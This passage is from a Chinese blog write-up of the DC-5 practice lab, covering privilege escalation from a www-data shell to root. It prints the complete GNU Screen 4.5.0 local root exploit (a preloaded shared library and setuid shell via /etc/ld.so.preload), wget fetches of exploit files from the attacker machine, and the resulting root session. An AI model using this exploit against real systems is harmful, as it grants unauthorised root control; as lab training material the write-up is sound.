class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>              </span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-5:~/html$ </span><br><span class="line">www-data@dc-5:~/html$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@dc-5:~/html$ <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure><h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><h3 id="1-尝试sudo-l"><a href="#1-尝试sudo-l" class="headerlink" title="1.尝试sudo -l"></a>1.尝试sudo -l</h3><p><code>发现没有</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">bash: sudo: <span class="built_in">command</span> not found</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure><h3 id="2-查看SUID"><a href="#2-查看SUID" class="headerlink" title="2.查看SUID"></a>2.查看SUID</h3><p><code>发现screen-4.5.0具有SUID权限</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/$ find / -perm /4000 2&gt;dev/null</span><br><span class="line">find / -perm /4000 2&gt;dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">www-data@dc-5:/$ </span><br></pre></td></tr></table></figure><h3 id="3-查看screen-4-5-0是否有漏洞"><a href="#3-查看screen-4-5-0是否有漏洞" class="headerlink" title="3.查看screen-4.5.0是否有漏洞"></a>3.查看screen-4.5.0是否有漏洞</h3><p><code>发现存在本地特权提升漏洞</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                    |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                                                     | linux/<span class="built_in">local</span>/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                               | linux/<span class="built_in">local</span>/41152.txt</span><br><span class="line">-------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">root@JIYE:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>上传文件</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># ls</span></span><br><span class="line">41154.sh</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cp 41154.sh /var/www/html/</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># systemctl start apache2</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/tmp<span class="variable">$wget</span> http://192.168.1.6/41154.sh</span><br><span class="line">converted <span class="string">&#x27;http://192.168.1.6/41154.sh&#x27;</span> (ANSI_X3.4-1968) -&gt; <span class="string">&#x27;http://192.168.1.6/41154.sh&#x27;</span> (UTF-8)</span><br><span class="line">--2020-08-25 00:57:32--  http://192.168.1.6/41154.sh</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1192 (1.2K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;41154.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">41154.sh            100%[=====================&gt;]   1.16K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-08-25 00:57:32 (350 MB/s) - <span class="string">&#x27;41154.sh&#x27;</span> saved [1192/1192]</span><br><span class="line"></span><br><span class="line">www-data@dc-5:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">41154.sh  demo.php</span><br><span class="line">www-data@dc-5:/tmp$</span><br></pre></td></tr></table></figure><h3 id="4-添加执行权限执行"><a href="#4-添加执行权限执行" class="headerlink" title="4.添加执行权限执行"></a>4.添加执行权限执行</h3><p><code>报错了。。。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ chmod +x 41154.sh</span><br><span class="line">chmod +x 41154.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory</span><br><span class="line">www-data@dc-5:/tmp$ </span><br></pre></td></tr></table></figure><p><code>查看文件，脚本是一个编译c</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat 41154.sh </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshellroot@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>下面进行本地编译</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat libhax.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat rootshell.c </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># </span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># cat run.sh </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</span></span><br><span class="line">./libhax.c: In <span class="keyword">function</span> ‘dropshell’:</span><br><span class="line">./libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘chmod’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">      |     ^~~~~</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># gcc -o ./rootshell ./rootshell.c</span></span><br><span class="line">./rootshell.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">./rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    3 |     setuid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> ‘setgid’ [-Wimplicit-function-declaration]</span><br><span class="line">    4 |     setgid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> ‘seteuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    5 |     seteuid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">./rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> ‘setegid’ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |     setegid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">./rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘execvp’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">./rootshell.c:7:5: warning: too many arguments to built-in <span class="keyword">function</span> ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment"># ls</span></span><br><span class="line">41154.sh  libhax.c  libhax.so  rootshell  rootshell.c</span><br><span class="line">root@JIYE:~/tmp/DC5/screen_4.5.0<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="5-执行"><a href="#5-执行" class="headerlink" title="5.执行"></a>5.执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/run.sh</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/rootshell</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.1.6/libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ chmod +x run.sh</span><br><span class="line">chmod +x run.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./run.sh</span><br><span class="line">./run.sh</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">thisistheflag.txt</span></span><br><span class="line"><span class="string"># cat thisistheflag.txt</span></span><br><span class="line"><span class="string">cat /root/thisistheflag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888b    888 d8b                                                      888      888 888 888</span></span><br><span class="line"><span class="string">8888b   888 Y8P                                                      888      888 888 888</span></span><br><span class="line"><span class="string">88888b  888                                                          888      888 888 888</span></span><br><span class="line"><span class="string">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888</span></span><br><span class="line"><span class="string">888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888</span></span><br><span class="line"><span class="string">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P</span></span><br><span class="line"><span class="string">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;</span></span><br><span class="line"><span class="string">888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once again, a big thanks to all those who do these little challenges,</span></span><br><span class="line"><span class="string">and especially all those who give me feedback - again, it&#x27;</span>s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure></div><div><div><div style="text-align:center;color:#000;font-size:20px">-------------纸短情长<i class="fa fa-paw"></i>下次再见-------------</div></div></div><div class="reward-container"><div>加个赞赏，万一有好心人呢~</div><button onclick='document.querySelector(".post-reward").classList.toggle("active")'>谢谢你请我吃辣条!</button><div class="post-reward"><div><img src="/images/wechatpay.jpg" alt="Lluna 微信"> <span>微信</span></div><div><img src="/images/alipay.jpg" alt="Lluna 支付宝"> <span>支付宝</span></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Lluna</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://lunamoore.github.io/2020/08/24/DC-5/" title="DC-5">https://lunamoore.github.io/2020/08/24/DC-5/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请标注链接及作者！</li></ul></div><div class="followme"><span>欢迎关注我的公众号</span><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/images/gzh.jpg"><span class="icon"><i class="fab fa-weixin"></i> </span><span class="label">WeChat</span></a></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶机</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/08/23/DC-4/" rel="prev" title="DC-4"><i class="fa fa-chevron-left"></i> DC-4</a></div><div class="post-nav-item"><a href="/2020/08/27/DC-6/" rel="next" title="DC-6">DC-6 <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2020 – <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Lluna</span></div><div class="wordcount"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-chart-line"></i> </span><span>站点总字数：</span> <span title="站点总字数">479k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span>站点阅读时长 &asymp;</span> <span title="站点阅读时长">7:16</span></span></div><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,8,14,15,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="小站已运行"+T+" 天 "+f+" 小时 "+h+" 分钟 "+u+" 秒"}siteTime()</script><div class="busuanzi-count"><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div><script color="0,0,0" opacity="0.7" zindex="-1" count="300" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: location.pathname,
    }, {"enable":true,"appId":"8hPlmJu758GqGb8p9gI7IWIH-gzGzoHsz","appKey":"EBvPjdspqOEm800591erwHwx","placeholder":"ヾﾉ≧∀≦)o来了老弟!","avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});</script><script type="text/javascript" src="/js/love.js"></script></body></html>